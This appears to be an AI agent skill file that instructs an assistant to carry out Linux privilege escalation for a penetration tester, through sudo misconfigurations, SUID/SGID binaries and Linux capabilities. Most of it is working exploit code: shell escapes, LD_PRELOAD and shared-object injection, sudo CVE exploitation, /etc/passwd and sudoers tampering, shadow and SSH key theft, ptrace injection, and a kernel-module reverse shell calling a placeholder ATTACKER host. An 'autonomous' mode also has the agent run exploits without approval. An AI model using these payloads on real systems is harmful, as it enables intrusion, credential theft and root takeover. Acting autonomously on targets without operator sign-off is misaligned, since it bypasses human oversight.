---
name: linux-sudo-suid-capabilities
description: >
  Exploit sudo misconfigurations, SUID/SGID binaries, and Linux capabilities for
  privilege escalation. Use this skill when the user has found sudo NOPASSWD entries,
  SUID binaries, or capabilities on binaries, or says "exploit sudo", "abuse suid",
  "gtfobins", "ld_preload", "capability escalation", "baron samedit", "sudo exploit".
  Also triggers on: "sudo -l shows NOPASSWD", "found suid binary", "getcap shows
  cap_setuid", "linux capabilities privesc". OPSEC: low-medium (binary execution,
  library loading create process artifacts). Tools: GTFOBins reference, gcc,
  python3, getcap, strace, ltrace.
  Do NOT use for cron/service/D-Bus abuse — use linux-cron-service-abuse instead.
  Do NOT use for file permission/path abuse — use linux-file-path-abuse instead.
---

# Linux Sudo, SUID, and Capabilities Exploitation

You are helping a penetration tester exploit sudo misconfigurations, SUID/SGID binaries,
and Linux capabilities for privilege escalation. All testing is under explicit written
authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present it and wait for user approval. Explain each technique before
  executing. Show GTFOBins reference. Ask before compiling or running payloads.
- **Autonomous**: Execute the most reliable technique. Try GTFOBins first, fall back to
  custom exploitation. Report results at each stage.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones:
  `### [HH:MM] linux-sudo-suid-capabilities → <hostname>` with actions and results.
- **Findings** → append to `engagement/findings.md` when escalation succeeds.
- **Evidence** → save proof to `engagement/evidence/` (e.g., `sudo-root-shell.txt`).

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[linux-sudo-suid-capabilities] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [HH:MM] linux-sudo-suid-capabilities → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[HH:MM]` with the actual current time. Run
`date +%H:%M` to get it. Never write the literal placeholder `[HH:MM]` —
activity.md entries need real timestamps for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Check what sudo/SUID/capability findings were identified by linux-discovery
- Leverage existing credentials for sudo password
- Skip techniques already tried (Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Credentials**: Add any new credentials discovered
- **Access**: Update access level (e.g., root shell obtained)
- **Vulns**: Mark exploited vectors `[done]`
- **Pivot Map**: Document escalation path used

## Prerequisites

- Shell access on Linux target
- At least one of: sudo permissions, SUID binary, binary with capabilities
- Knowledge of target OS version (for CVE matching)

## Step 1: Assess Sudo Configuration

If not already provided by linux-discovery, enumerate:

```bash
sudo -l 2>/dev/null
sudo -V 2>/dev/null | head -1
cat /etc/doas.conf 2>/dev/null
```

Classify findings and proceed to the relevant subsection below.

## Step 2: Sudo NOPASSWD Exploitation

### GTFOBins Binaries

If `sudo -l` shows `(root) NOPASSWD: /path/to/binary`, check GTFOBins for the binary.

**Common sudo escapes (highest priority):**

```bash
# Editors
sudo vim -c ':!bash'
sudo vi -c ':!bash'
sudo nano  # Ctrl+R → Ctrl+X → command

# Pagers
sudo less /etc/hosts    # then type: !bash
sudo more /etc/hosts    # then type: !bash
sudo man man            # then type: !bash

# Interpreters
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
sudo php -r 'system("/bin/bash");'
sudo node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

# File utilities
sudo find /tmp -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo sed -n '1e exec bash 1>&0' /etc/hosts
sudo ed  # then type: !bash

# Archive utilities
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo zip /tmp/x.zip /tmp/x -T -TT 'bash #'

# Network tools
sudo ftp  # then type: !bash
sudo nmap --interactive  # (old nmap) then type: !sh
sudo mysql -e '\! bash'
sudo socat stdin exec:/bin/bash

# System tools
sudo env /bin/bash
sudo strace -o /dev/null /bin/bash
sudo ltrace -o /dev/null /bin/bash
sudo gdb -nx -ex '!bash' -ex quit
sudo taskset 1 /bin/bash

# File read/write (for credential theft if no shell escape)
sudo cat /etc/shadow
sudo tee /etc/passwd <<< 'root2:$1$salt$hash:0:0::/root:/bin/bash'
sudo cp /etc/shadow /tmp/shadow_copy
sudo dd if=/etc/shadow of=/tmp/shadow_copy
```

### Sudo with Password (NOPASSWD not set)

If user has sudo access but needs a password, check for:
- Known password from engagement state
- Password reuse from other services
- Sudo token reuse (see sudo_inject below)

### Sudo with Specific Arguments

If sudo allows specific arguments (e.g., `sudo /usr/bin/vim /etc/config`):
- Editor escape still works: `sudo vim /etc/config` → `:!bash`
- For restricted commands, check if argument injection is possible

## Step 3: Sudo Environment Variable Abuse

### LD_PRELOAD Injection

**Prerequisite:** `sudo -l` shows `env_keep += LD_PRELOAD` or `SETENV:` tag.

```c
// preload.c — compile on target or transfer
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
# Compile and exploit
gcc -fPIC -shared -o /tmp/preload.so preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <any_allowed_binary>
```

### LD_LIBRARY_PATH Injection

**Prerequisite:** `sudo -l` shows `env_keep += LD_LIBRARY_PATH`.

```bash
# Find shared libraries used by the sudo-allowed binary
ldd /path/to/allowed_binary

# Create malicious library with same name
gcc -fPIC -shared -o /tmp/libfoo.so preload.c -nostartfiles

# Execute with hijacked library path
sudo LD_LIBRARY_PATH=/tmp /path/to/allowed_binary
```

### PYTHONPATH / PERL5LIB Injection

**Prerequisite:** `sudo -l` shows `SETENV:` and binary calls Python/Perl.

```bash
# Python library hijack
mkdir /tmp/pylib
cat > /tmp/pylib/os.py << 'EOF'
import subprocess
subprocess.call(["/bin/bash", "-p"])
EOF
sudo PYTHONPATH=/tmp/pylib /usr/bin/python_script.py
```

### BASH_ENV Injection

**Prerequisite:** `env_keep += BASH_ENV` and command runs via bash.

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/evil.sh
sudo BASH_ENV=/tmp/evil.sh /path/to/allowed_command
/tmp/rootbash -p
```

## Step 4: Sudo CVE Exploitation

### CVE-2021-3156 (Baron Samedit) — Heap Overflow

**Affected:** sudo 1.8.2 through 1.9.5p1 (patched in 1.9.5p2).

```bash
# Check version
sudo -V | grep "Sudo version"

# Vulnerability test (does NOT exploit, just confirms)
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# Vulnerable: segfault or memory error
# Patched: "usage: sudoedit" error

# Exploits (multiple variants by OS):
# https://github.com/blasty/CVE-2021-3156
# https://github.com/worawit/CVE-2021-3156
```

Public exploits exist per distribution. Match the target OS and use the correct variant.

### CVE-2019-14287 — User ID Bypass

**Prerequisite:** `sudo -l` shows `(ALL, !root) /bin/bash` or similar restriction
excluding root.

```bash
# The !root restriction can be bypassed with UID -1
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
# Both resolve to UID 0 (root)
```

### Sudo Token Reuse (sudo_inject)

**Prerequisite:** ptrace_scope = 0, user has valid sudo session token.

```bash
# Check ptrace scope
cat /proc/sys/kernel/yama/ptrace_scope  # Must be 0

# Check for sudo token files
ls -la /run/sudo/ts/$(whoami) 2>/dev/null || ls -la /var/run/sudo/ts/$(whoami) 2>/dev/null

# If sudo token exists and ptrace allows:
# https://github.com/nongiach/sudo_inject
# Creates invalid token → next sudo -i requires no password
```

## Step 5: SUID Binary Exploitation

### Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null   # SGID
```

### GTFOBins SUID Exploitation

Same escapes as sudo but binary runs as owner (usually root). Key difference:
bash drops privileges unless `-p` flag is used.

```bash
# If /usr/bin/python3 has SUID bit
/usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# If /usr/bin/find has SUID bit
/usr/bin/find . -exec /bin/bash -p \;

# If /usr/bin/vim has SUID bit
/usr/bin/vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'

# If /usr/bin/bash has SUID bit
/usr/bin/bash -p

# If /usr/bin/cp has SUID bit — overwrite /etc/passwd
# Generate password hash: openssl passwd -1 -salt xyz password123
# Add line: root2:$1$xyz$hashhere:0:0:root:/root:/bin/bash
/usr/bin/cp /tmp/modified_passwd /etc/passwd
```

### Custom SUID Binary Analysis

For non-standard SUID binaries not in GTFOBins:

```bash
# Analyze the binary
strings /path/to/suid_binary | grep -iE "system|exec|popen|/bin|/tmp"
strace /path/to/suid_binary 2>&1 | grep -E "exec|open|access"
ltrace /path/to/suid_binary 2>&1 | grep -E "system|exec|popen"
```

**Exploitation patterns:**

1. **Calls `system()` with relative path** → PATH hijack:
```bash
# If binary calls system("service apache2 restart")
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/path/to/suid_binary
```

2. **Loads shared object from writable path** → .so injection:
```bash
# Check for missing libraries
ldd /path/to/suid_binary | grep "not found"
# Or check RPATH/RUNPATH
readelf -d /path/to/suid_binary | grep -E "RPATH|RUNPATH"
```

```c
// exploit.c — shared object with constructor
#include <stdlib.h>
void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o /path/to/missing_lib.so exploit.c
/path/to/suid_binary  # triggers library load → root shell
```

3. **Reads/writes files as root** → read /etc/shadow or write /etc/passwd

### SGID Exploitation

```bash
# SGID binary runs with group of file owner
# If SGID binary belongs to 'shadow' group → read /etc/shadow
# If SGID binary belongs to 'docker' group → Docker socket access

# Impersonate group via Python SGID binary
python3 -c 'import os; os.setgid(42); os.system("/bin/bash")'  # 42 = shadow
```

## Step 6: Linux Capabilities Exploitation

### CAP_SETUID — Direct Root

```bash
# Any binary with cap_setuid+ep → immediate root
# Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'

# Node.js
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

# Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# PHP
php -r 'posix_setuid(0); system("/bin/bash");'

# Custom C binary
# If gcc and cap_setuid binary available:
# Compile: int main(){setuid(0);setgid(0);system("/bin/bash -p");}
```

### CAP_SETGID — Group Escalation

```bash
# Impersonate shadow group to read /etc/shadow
python3 -c 'import os; os.setgid(42); os.system("cat /etc/shadow")'

# Impersonate root group
python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'
```

### CAP_DAC_OVERRIDE — Bypass Write Permissions

Binary can write to any file regardless of permissions.

```python
# Append to /etc/sudoers
python3 -c '
f = open("/etc/sudoers", "a")
f.write("\nUSERNAME ALL=(ALL) NOPASSWD:ALL\n")
f.close()
'
```

```python
# Overwrite /etc/passwd with root user
python3 -c '
import crypt
password = crypt.crypt("password123", "$6$salt")
line = f"root2:{password}:0:0:root:/root:/bin/bash\n"
with open("/etc/passwd", "a") as f:
    f.write(line)
'
```

### CAP_DAC_READ_SEARCH — Read Any File

```bash
# Read /etc/shadow directly
python3 -c 'print(open("/etc/shadow").read())'

# Read SSH private keys
python3 -c 'print(open("/root/.ssh/id_rsa").read())'

# Tar-based extraction (if tar has the capability)
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/
```

**Container escape (shocker exploit):** Binary with cap_dac_read_search can use
`open_by_handle_at()` to access host filesystem from within a container. Use the
shocker exploit C code.

### CAP_SYS_ADMIN — Mount and Namespace Abuse

```bash
# Mount host disk (container escape)
fdisk -l  # Find host disk
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

```python
# Mount overlay to replace /etc/passwd
python3 -c '
from ctypes import CDLL
libc = CDLL("libc.so.6")
libc.mount.argtypes = [c_char_p, c_char_p, c_char_p, c_ulong, c_char_p]
libc.mount(b"/tmp/fake_passwd", b"/etc/passwd", b"none", 4096, b"rw")  # MS_BIND=4096
'
```

### CAP_SYS_PTRACE — Process Injection

```bash
# GDB injection into root process
gdb -p <root_pid>
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'")
(gdb) detach
(gdb) quit
```

```python
# Python ptrace injection (shellcode into root process)
import ctypes, os, struct, signal

PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_CONT = 7

libc = ctypes.CDLL("libc.so.6")

# Find a root-owned process
pid = <target_root_pid>

# Attach, inject shellcode, set RIP, continue
libc.ptrace(PTRACE_ATTACH, pid, None, None)
os.waitpid(pid, 0)
# ... inject reverse shell shellcode at RIP ...
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

### CAP_SYS_MODULE — Kernel Module Loading

```c
// reverse_shell.c — kernel module
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");

char *argv[] = {"/bin/bash", "-c",
    "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1", NULL};
static char *envp[] = {"HOME=/root", "PATH=/usr/bin:/bin", NULL};

static int __init shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit shell_exit(void) {}
module_init(shell_init);
module_exit(shell_exit);
```

```makefile
# Makefile
obj-m += reverse_shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

```bash
make
insmod reverse_shell.ko
```

### CAP_CHOWN / CAP_FOWNER — Ownership and Permission Changes

```bash
# CAP_CHOWN: take ownership of /etc/shadow
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
cat /etc/shadow  # Now readable

# CAP_FOWNER: make /etc/shadow world-readable
python3 -c 'import os; os.chmod("/etc/shadow", 0o666)'
cat /etc/shadow
```

### CAP_SETFCAP — Capability Chaining

Binary can set capabilities on other binaries. Chain to cap_setuid:

```python
# Set cap_setuid on python3
python3 -c '
import ctypes
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")
libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p, ctypes.c_void_p]
cap = libcap.cap_from_text(b"cap_setuid+ep")
libcap.cap_set_file(b"/usr/bin/python3", cap)
'

# Then exploit cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### CAP_NET_RAW — Packet Sniffing

Not directly exploitable for privilege escalation but enables credential sniffing:

```bash
# Sniff for credentials on the network
tcpdump -i any -A -s0 'port 80 or port 21 or port 25' 2>/dev/null | grep -iE "user|pass|login"
```

## Step 7: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After obtaining root:

- **Credentials found** (sudo password, /etc/shadow hashes): Route to hash cracking
  or use credentials for lateral movement
- **Root shell obtained**: Route to **linux-file-path-abuse** for persistence or
  **linux-kernel-exploits** if further escalation needed (container escape)
- **Need AD credentials**: Check for cached Kerberos tickets (`klist`,
  `/tmp/krb5cc_*`), SSSD cache, or domain-joined machine secrets → route to
  **credential-dumping** or AD skills
- **Pivot needed**: Enumerate internal network from elevated context, use new
  access for lateral movement

When routing, pass along: hostname, escalation method used, current access level,
credentials obtained, current mode.

## Troubleshooting

### SUID binary drops privileges (bash without -p)
Bash resets EUID to RUID when they differ. Always use `bash -p` or call
`setuid(0)` before exec. For `system()` calls: the child shell also drops
privileges — use `execve()` instead or `system("/bin/bash -p")`.

### LD_PRELOAD doesn't work with sudo
Check: (1) `env_keep` includes `LD_PRELOAD` in sudo config, (2) binary is not
statically linked (`file /path/to/binary`), (3) binary is not running in secure
mode (SUID binaries ignore LD_PRELOAD by default — only works via sudo).

### getcap returns nothing
Some systems strip capabilities. Check if `getcap` is available and has read
access to binary directories. Try `cat /proc/<pid>/status | grep Cap` for
running processes.

### Kernel rejects module loading
CAP_SYS_MODULE may be restricted by Secure Boot or module signing. Check
`cat /proc/sys/kernel/modules_disabled` — if 1, module loading is disabled
system-wide. No bypass without kernel exploit.

### SUID binary is statically linked
Cannot use shared object injection or LD_PRELOAD. Focus on argument injection,
environment variable abuse, or functionality-based exploitation (GTFOBins patterns).
